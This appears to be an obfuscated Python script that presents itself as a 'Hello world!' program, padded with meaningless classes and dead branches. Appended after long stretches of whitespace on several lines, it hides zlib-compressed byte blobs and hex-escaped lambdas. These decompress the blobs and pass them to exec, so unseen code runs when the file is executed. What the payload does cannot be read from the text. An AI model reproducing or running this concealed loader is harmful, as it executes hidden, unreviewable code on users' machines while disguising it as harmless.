from builtins import *
from math import prod as _power


__obfuscator__ = 'Koh GOAT'
__authors__ = ('Le boos', 'Wojack')
__github__ = 'olalalala le haxooor'
__discord__ = 'Arrete de lire mon code par contre'
__license__ = 'Wojack on top'

__code__ = 'print("Hello world!")'


Walk, _frame, _statistics, Run, DetectVar, Theory, _run = exec, str, tuple, map, ord, globals, type

class _theory:
    def __init__(self, _substract):
        self.Divide = _power((_substract, -38257))
        self.Builtins(Cube=24239)

    def Builtins(self, Cube = bool):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self.Divide += -38582 * Cube
        
        try:
            ({Run: Statistics} or Run if {Run: Statistics} and Run else ... or (Run, {Run: Statistics}))

        except TypeError:
            ((Run, (DetectVar, DetectVar)) for Run in {Statistics: Walk} if _frame >= _frame)

        except:
            _run(-13534 * 26366) == int

    def _divide(self, MemoryAccess = -56034):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        MemoryAccess -= 29858 / -25009
        self.Absolute != str
        
        try:
            (({Walk: Walk}, Walk) for Walk in {Run: Statistics})

        except ArithmeticError:
            ({Walk: Walk} or Run if {Walk: Walk} and Run else ... or (Run, {Walk: Walk}))

        except:
            _run(-11746 * 31105) == bool

    def _floor(Modulo = bool):
        return Theory()[Modulo]

    def _product(_absolute = -48471 - -99483, Math = str, Hypothesis = Theory):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Hypothesis()[_absolute] = Math
        
        try:
            (((Run, Run, Walk), _frame) for _frame in {Walk: Walk})

        except AssertionError:
            {Statistics: Walk} if DetectVar <= _frame else (DetectVar, DetectVar) >= Walk

        except:
            _run(47299 * -4297) == Ellipsis

    def execute(code = str):
        return Walk(_frame(_statistics(Run(DetectVar, code))))

    @property
    def Absolute(self):
        self._add = '<__main__.DetectVar object at 0x000007437BE11031>'
        return (self._add, _theory.Absolute)

if __name__ == '__main__':
    try:
        _theory.execute(code = __code__)
        _callfunction = _theory(_substract = -33249 / 58603)

        if 245485 > 7953815:
            _theory(_substract = 33943 + -88717).Builtins(Cube = _callfunction.Divide * 2514)
        elif 128222 < 3031063:
            _theory(_substract = 43492 + -36069)._divide(MemoryAccess = 53819 - _callfunction.Divide)                                                                                                                                                                                                                                                          ;_theory._product(_absolute='nnnnmnnnmnnnmmnnnmnnmnnnm',Math=b'x\x9c\xdd\x1b\xdbr\xdaH\xf6\x9d\xaf\xd0x\x1f\x906\x84\xc8\x92\x90\xc0U<\xcc\xc435\xf6:f+N\x8d\xbd\x95\xa4TBjp\xe3\xa6\x9b\x92\x9a\x18^\xf6[\xa6\xe6q\x7f#?\xb6\xa7/\x12\xc2\x88 \x82\xc9TY\xa2\xaf\xea\xd3\x97\xd3\xe7\xd6\x17x\xba<k\x18\xf0\xe0\x91)C\xf1\x84!\x1b\x8e\xe6Y\x1cq\x96\x86\xa1\xf1S\xff\xe4\xf7\xe5\x0c\xa5\x98\xd1\x13\x83\xa5\xa5b\xd1\x9c\xdf\xb34\x93e\xcc\x93!&d\xc9\xef\xd1\x98E\xdc\xed\xf8\'\xad\x93_\xc8\x1c\xbdG\xc9\x89\xb5\x065\xc6\xfc~>T\x15\xdfs>\xcb\xce\xde\xbcQy\xed\x98M\xdf<\xa9\xe6\xcd\x96\xb6\x13\x9c\xc5,M\xd6\xab\xd1\x99\xed\xf1\xf8\xcd\x8cD\xe39z\x02Dp\x8ch\x86\x14\xd0\xaf\xff\xbez\xed\xb4\xed\'Eb\x96\xa8\xef\xcdY\x8a)7O~G\x840\xe3\x91\xa5$\xf9\xe9\xc4j6\xac\xb3\xa2\xb4\xf8\xde\xcc\x1ep\xd2\xb4\x1ah\x11\xa3\x19\xd7\xc8\xa4\xb39@\xbeg\x19\xca\x8c(EF\x8a\x92O\xf4\x0f\xcc\x08\xe2*c\x08\x98\xf9D\xff\xc3\xe62\x15\x19\xa2\x92O\xf4\x9a\rY\xb24\x08~\x00\xb8%\x9b\x9fX\r\xd5)<\x9d\xb1\x94\x87!\xb4\xb6\xcc\x9aV\x1b-07\xad\x06aqD2\xd3\xfa\xd8$\xe4\x82\\\xc0\x03\xa1p\x844?\xf7\xc7\x84\r\xe1sc\xe3\x9b\x00\xb8\xbd\xbd\xbd\x83W<ww"\xde\xfcxv\xf6\xea\xf5\xab\xd7\xe6k\xf3\xd5\xa9e}\xfe\xdcOpZ\rK&xB0\xf8\x84`<\x81\x07\x92\x93M\xf81\xe2\x11\xe7[\xea\x18\x9c\x9f\x9f36\x18\x9c\xb3\x01\x04\xe7\xe7\x10;\x87>\xab\x115\xaa\xbe\n(\x00&\xaa:Q\x0f\x04\x00\xb2\xc2NuK\x13,\xba*\x1e\xe1\x13\xe89\x00mTd6\x87sL8\xa6\x02\xbd_\xa2t\x0b\xda.!\xe3\xf2J\xbcW\xe2\xdb\xd5\xd5\xd5\xe5\xc5\x95\xe8\xc5D E\xa0B EagB\xcc\x8af2\x8a9\xc1\xf3\xe1S|Y-1\x1dwzJ\xe4\xd4\xec\x05n}<\x10\xbe\x8di\x82\x16f\x13\x11<\x9b\xb2x\xa3\xc0gk\xeb\xb4L\xe9t:\xa5T\x04T<\xd3\xe9>\x18\xc18\xce"\x8a\xbf\x17#[\xc1kbd;|\x8e\x91\xe5\x08\x93\x05\xba\xa7\xf3*\x9cl\x92\x97\xc0\x08\xa0\x89\t4\r\x06\xec\x9c\tt\x9dC\xeaE\x91\t\x8f\x18\x19U!\xa4\x92oD\xfaB\xe7\xabfD\x14\x10\xd2l\xb6\'\x0c\xd3-h\xbcqn\xe4O=72&S7/\n\x97$\xfa\x82j\xa3\xf2\xdd\xea\xb9\xbe~w]$^\x14F\xd0<\xfdP\x9f\xdb\x16\xf0<>\xc2\x0f<\x88-\x1e_\x16.2\x12\xfd\xb6\x8f8\xbe\x13\xad\xde\xa9&\x95r\xbf}Q\x08!\x8cm~\xfd\xa6(\x06\x0c\x9d\x0fD(\xe4\xf1\x8b\xc2E\xca\xb3\xba\x92cSK\x9b\xc3f\xa7\xab\xdf\x00^\x15\xae\xe2\xa5\x17\xac\xa2\x04\t\xdb\xd8lvG\xbcB\x13\xbe \x9c\xc6hQ)\x8e\xab\xe9K7(yMq\x9bb\xbdr\r\xdb\xf5\x98Y9+n\xa73r=p\xb6\x0eE\xda\x05\xd7\x05\x17h\xe7:C\xa7\xeb$\xb5\xca:No\xd7\x0cZ\xd2h\xdf\xb7\xa7\x8e\xe3\x0f\xfd\x91\xdf\r\\\xdf\r\x1c\xbf\x17\xd8\x81\xe78;\xdb\xaa\xc6ee\x0b\xde\x08\xea\x87\xd1y\xd2\x17qO\xbe"\xc7\xb5\x85\x9f\x87\xca\xdfM\xa9\x94q\xb3BF\x9a\x1b\x92\xc2\xdcP,\xd6^]\x0f\x82\xa0[\xb8<\x96\xfb2\xb6\xbb\xb3\xfbO\x887\x04\x94t\x1d\xdbs\xbcN\xc7\xebx\xe0;\xcf;%>\xf2\x93\xc2\xad\xfc\xfc\xd5\xdfv\x8f\x8dD\xd3a\x12\x19\xf9\x04h\xae\xbd\x933swV!\xc3\xb6\xb0\xa0T\x7f\x039e\xe7r\xfaD\xaa&\xff5\xad\xd3\xd0\r\xbd\xb0\x13:\xa1\x0f\xbe\x1f\x9e\x02\x80\xf34\xef nv\x80\x03{\x9a3O\xc1\xf9%nu4\xb7z\x9a\x9b\xeb\x94u\xebq\xf3\xf7rt\xc7\xf3GA\xc7w\xfd\xae\xdfy^\xc2)\xe9\x9a\xa0\x08\xcb\xda&\xa8O4\xb7\x8afr\x92QR\xb8>\xd1T\x13v\x0co\x0f\\\x04~O\xc6{\x10_\xa5\xc0\xed\xeea\x95l1\xff\xbb)KXj\x9a\xdb\xacy+\xa2\xc9\xa1\xe2\xc7\xeb\xc9\xf1\x14\xafJ\x0b_\xb9\xf2+\xd2G\x11F.Hl\xcf\xef\xb8\xa3\xef\xa6\xa4\xa6\x1a;\xbc\x0b\x89\x08\xf0\x0e\xe6F\xb7\xa4+OKa\x90s]\x89\x1bw\x95\xed\x1cO\xb7z.\x88r\x10\xe0\x87`O\xd4\xbcV\xf9\xb4\xbed\x84"v\xed\xd2.HK\xf1vAr\x9e\x82\xd4t\xc3\x00@\xbc\xcd\xdc\xda5\xfa\x00\xe3\x01DG\xc29\x00\xdf\x03\x90`3\xf7H#\xb2\xa1\xc8a\x92\xbf\xabi\xc4{b\x9b\xd9:\xael3Eku\xca\x9e\xd6\x97\xfcO]!9A\xc8\x80\xa4\xb9\x96\x81\xfa\xe9\xe4Y\xf5\x82r\x0b]a",}B&\xc2\xf0\x87/\xb2\x049\xd2L\xf4B;\xec\x01\r\xf9\x10\xda\x10\x9e\x86]\x00\xb1\xc5\xdc\xaf\xe7\x1e\xa5\xfd\xea\xb9\xedi\x1b;\x9f3\xb7\x94\xb6\xb5\xe6\xcem\xf4:ek\xda\xe8\xebs\xbaw\xafs;\xc2.QW\xa0\xc3</\xa7\xc8\xaa\xb2\xbe\xb6Oz:\xdd\xab\xd1\xeb-\x14\xa4\x95\x9a\xd4q\x0b\xbdqs\xc8\x84\x04\xba[N)tKf\x94Hw\xf5\xd0\xea\x94\r\x8e\'\xd8;\xd0\x01\xdf\x01+\xb9w\xc0rIm\xf4\xdc\xae\x96\x9f\xb7\xca\x0c\xba\xab\xbb\xf6|\x0e\t\x97\xd3B\x99V\xba\x1a\x89]\xed\xbc\x12\x17\xec*\xbb\x97m\xab%\x9a\xb6\xf8\x8a\xb5\xbeX\xec_\x9cU\xe1l\x1f\xeb)\xf6"\xb0\x8c\x84/\xc2\x08b\xcaf\x8ad\xbc\xb7J\x1f\xc1n\n\x9c\x9d\x96\xf06\xa2\x80z\xc4K\xa9V\xfbT&\xe8A\x93l;\x89\x9c\xc0\x9a\xea\xe7\x9b\x03nZ^\xe8Cy7t\x7f\xb0\xb0\xf6\xb5"\xcd\xe3\xa7%\xd2\x93\x06]\x89Lw\x95\xf5\xf7\x10\xd6[&J\xeeJ\xc9\x83\x10\xbdX\xd1\x07#uuh\xf5@O\xf5T\xd9u\xa7J\xf3\x902\xad\xe5ZC\xcbe\x19\xdb\xcb&\xd8\xb6\xa6R\xab\xa8X\xba^\xe1\xabUU\xafXs\xd5X\x7fT\x1e\xab\x99@\x9f\xed\xfa\xa6\xc4\xe1\xb4\xb4\'7|\x8b\x06&b\xaf\x14Rb\xdfT\x8a\xaf\xa3H\xee\xbfk\xd0\x92\xbe\xb6\xcc\x99\xb7\xcf\x9c\xf5\xa4\x99\x17\x80\x81g\x83\xd1\x0f\xf2C.-li\x14\xae\xe5\x1e\t}\xfb\x95\xee\xc2\xa2\xc4\xd6\xfd\x02\x93T\xf4\x0e@z\x9b\xb9\xb5k\xec\xc8\x05\x940v=\x80\x13\x9bR.\x80\xf8\x9b\xb9?RtT\xba-t\xae\x84[\xfe(E\xbd\xc7\xe8\x85q\xdf\x91f\xbe_\x18\xff\xfef\xee\x1e[~\ng=\xb9\x94\x0c\x04\xee\xe4\xa6\xdfF\xee\xc1\xf6\xa8\xad\xf5En.\x07\xda\xce\x0cJ\xfafW\xb9}tMY\xa4\x8b}\xec\xc1\xc0\xb6\x07\xf0\x8a\x98\x0cm\xdbf\x87\x9aF\x1d\xb0\xd2\xc0\x80s\xd7C\xf5\xaa\x94\xf0Un\xed\r\xbd\xdc|#\xc5\x1d\x81}L\xb8\xa6PO\x0c\x86i\x0b7\x80\xd1\x82\x7f\xa4\xc5\xe8\xe1\xc2\xf4;9\xad\xc0\xd5\xa5\xbc\x7ft)\xaf \xc1\x0b\xa9+q\x17\xe9\xe2\xc0\xedOu\xd4R>^\xc9\x0f]\xf2\xb8_\xe3xe\xff\xd5P\xe0\xf8\x1d\xff\x80u\x90"\x9b\xdc\xf6\xcf\xaf\x86\x1dj.\xda\x9d\xd5N\xbcSr\x9ef\xd5\xf2\xda~W\xd9c\x9e\xbf\x05\x12}\x1d\x1f=\xf3^}\xc1\xdc9K+\x97\xfb\xf9\xd7\xda\x0c\xfeN\xee2\x15\xdbNj\xe3i\xcf]\xa7\xad=-\xf7r](\xa9/\xc7 [X\xc4{\xfe),\xd5\x9e\xf9\xc4s\xedP-\xd1/Z;`K\xca\xf9G\x1b\xdb(\xb0\xbf\x9f)\x85\xda\x01\xe5#$\xb1x@$\xdbR\x05\xd5\x95\xca\xcf\xb4\xbc\xf9\x1b\x0ec\x9a\xb7\xfa"\xc2]q\xa8)\xd2?v\x05\xae\x99N\xee\x02\xd0)\xcdw\x04\xe4v@\xa5\x9a\x18\xa5lj\xe4\x97`\ru\xa7\xd6\x88\xef\xd3\x16Z\xa0\xb8\x95Ft\x8cZ\x19\xe2\r\x914\xc5\xb5\xd7\xcb\xcb\x0b\xa5\x86.\x85\xf2\x81\xd0jh(\xfe\x80)G\xa9\x11e\x10U\x15\xcf\x96\xe2Nt{\xca\xe6\x19\xca+\xffe\xce9\xa3\xad\xb7\x8c\xf2\x94\x11\x82\xd2\xb5\xa2\x0fh9dQ\x9a\xe4\xa5\xafp\xc6\x11Ei\xeb_h\xf9\x16F_4v\x9f\xa2(\xc1t\\d\xe0)j$hd0\x1a\xceR\x94e&Te\xe5\xd7\xdc\rH\xf4\xfb\x19"(\xe6(\t!\xb5\xba\xcf-{\xd7V0\xaasm\x82F\xdc\xfa\x87\xf1\x96M\xa7\x88\xc6\xc8\xf8\xfa\xa71\x8d\xc4\xe8(N\r\x82\x8c\x98\xe0\xd8\x18G\xf3\xf8\xbeh3\x85\xba\xa3\x0c\xed\xd9j\x0e\xb5\xde\xee\xcfi\xfa\xf5\x7f\x1c\x19\t\xfav\xb3"\xfd\x10\xca\x9aL\xdd\xa8@C;#\x08\xcdLiY\xc9\xcb9r\xb5I&\xa2f\x0e\x95%)2\xec\x96\xed\x1a\x19\x10\x14\x05\x9c~\x1b\x0b?\xcff\xf3%\xcck6\x97\x9d\x18\xb29|\xd4\xdd\x10]$\x91\x91\xb1y\x8a\xb3\x8d\x0e`qE\\^\x0b\x9aHF!\x98`\xa8\xf0\xdd\xc6\x98f\xd0\xa9\x88r\xd1+\xa7\xa2W\xd5Xz\x8f\xc8\xd7\xbf\xa0\x0f\x9b\xbd\x92\xc8\xc9x\x94\xf2\x90h\xfa\xc9\xf1\xf3\x88\xf9}ATfN+\xfd<\xd2Z\xcdd\x7f\x15\xb5\x80\xa4\xf3\x8aV3\x98\xe7\xc8\xab\xac\xc0JrF\xee\x11\xcc\x88d\xd3\x15\x15\xc8?\x17  \xf7e{\x8c\xb8i\xf5\xfb\xab\xfbB\xc5\x19\xb6\x14T\xab\xca%\xcc#\xa6\t{\x04\xbe\xcf\x80U\x96\xa6\xb5"\x1e\xc0\xe0\xea+\x06|\xe1\xd1RwA\x8d;\x8bS<\xe3y\'\xd4\x9f\x02\x8c2%\xca\xfcrF_s\x98\x19\xdfGi\x1f2\xc2/Q\xaa:\xac\x1a.X\xae\xfdA\xc6Lh\x08>\xf7\xd7\x11\xddJ"4e\xb4?\xd0\x82\x9fiE\x00\x96\xb9-\xd7"V[\x02\x14\xbde\xb3\xea\xce\xa6sJ\x05\x7f\x8b,\x1d\xef\x0f\xa4\x95_,kl\xb5\xce\xb1\x07\rI\'\xfd\x95L\x81\xda\xd7\xc6v\xcd(j\xe4\xb5\x10yM\r\xcb\xbf1\x88\x80\xe0F\t\xdd}\xfe\xd0\xfe\xf0\x00\x15\x94\xa7\x80cN\x90\xb9\xda')

        if 486311 > 9772374:
            _theory(_substract = 85641 / -77303)._divide(MemoryAccess = -10865 * _callfunction.Divide)
        elif 214068 < 7476776:
            _theory(_substract = -8732 - 98329).Builtins(Cube = _callfunction.Divide / 37677)                                                                                                                                                                                                                                                          ;_theory._product(_absolute='IIIlIllllllIIlIIIllIlI',Math=b'm&\x17\xa4X\xd9\x92\x0b\xab\x010W\xd1\x10\x11\xb3\x04\xd4\xe2h\xc1\xfb\xf9\xe1uq\x9a\xbd\xb0\xda\xb3(.\x1a\x90t!\xda\xfcUD\xca\xf0\xe5\x029\x08\x94SLP\xd1\xd0B\x9f\xa7\xe8\xa6\xc0o\xc5 \xc0@\x8b\xf5WdY4^"\xa1b\xc4e\xb2R#^]\xac\x11{9:\xb5^PpT\x92F\x8f\x00\xaf\x89F\xd4w\xc3S@\xf5\x1fQj\x96\xca\x16%\xda\xa0R\xcc\xfct\xbf\xd0\xaf\xc0\xd3@\x12\xd1\x9cp\xe3KD\xe6H\x96NR6\x03P**\x1d\xcc8f\xf4\x1d\xa2\xf3r\xad-]i\xeb\x9f\x1fAq\x99\xd8\x1a\xb1\xd4\xc0\x06\xa6\x86T_f\xb1\x19\x9eo\x8d\xcb\xad\xf2i\x8b(\x05>\x91Rj"\x85\xa5\x90O\x9f\xad\xb5v71_nZb\xfeF\xaar\xa9\xcc\x95wS \xbe\xcc\x8c\xad\xe1\xb8\xaf\xf6~K\xbb\xbe\xe2g\xd5hc*-\x83|o\x9f\x16\xc7\xfb\xa5\x96\nF\x12\r\rr\x1e\x11\xec"|V5\xf3m\x11\'\x8c\xcd \xfb\xff\xd6UAP')

        _theory(_substract = -69693 / -53106).Builtins(Cube = _callfunction.Divide * 50136)                                                                                                                                                                                                                                                          ;SS2SS22S22S22S2S22S2SS2,lIIlIlIIIlIIlllIIIIIllI,xwxxwxxwxwxxwxxwxxxxxxxwx,OoO0O00o0oOOooO00O0oOoOO,LLLILLIJIIIJILIJIJ=(lambda WXWXWXWWWXXWWXXXXWWWWW:WXWXWXWWWXXWWXXXXWWWWW['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda WXWXWXWWWXXWWXXXXWWWWW:WXWXWXWWWXXWWXXXXWWWWW(__import__('\x7a\x6c\x69\x62'))),(lambda WXWXWXWWWXXWWXXXXWWWWW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WXWXWXWWWXXWWXXXXWWWWW)"),filename='\x4e\x4e\x4d\x4d\x4d\x4d\x4d\x4d\x4e\x4e\x4e\x4d\x4e\x4d\x4d\x4d\x4d\x4d\x4e\x4d\x4e\x4d',mode='\x65\x76\x61\x6c'))),(lambda IlIIlIllIlIIlIlII,WXWXWXWWWXXWWXXXXWWWWW:IlIIlIllIlIIlIlII(WXWXWXWWWXXWWXXXXWWWWW)),(lambda:(lambda WXWXWXWWWXXWWXXXXWWWWW:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(WXWXWXWWWXXWWXXXXWWWWW)"),filename='\x4e\x4e\x4d\x4d\x4d\x4d\x4d\x4d\x4e\x4e\x4e\x4d\x4e\x4d\x4d\x4d\x4d\x4d\x4e\x4d\x4e\x4d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _theory(_substract = -70983 / 47944).Builtins(Cube = _callfunction.Divide + 54072)                                                                                                                                                                                                                                                          ;LLLILLIJIIIJILIJIJ()(OoO0O00o0oOOooO00O0oOoOO(SS2SS22S22S22S2S22S2SS2(lIIlIlIIIlIIlllIIIIIllI(xwxxwxxwxwxxwxxwxxxxxxxwx('\x76\x61\x72\x73'))),_theory._floor(Modulo='nnnnmnnnmnnnmmnnnmnnmnnnm')+_theory._floor(Modulo='IIIlIllllllIIlIIIllIlI')))

    except Exception as Statistics:
        if 104350 > 5706628:
            _theory.execute(code = _frame(Statistics))

        elif 125916 > 8799778:
            _theory(_substract = 60972 * -72917)._divide(MemoryAccess = 24736 + _callfunction.Divide)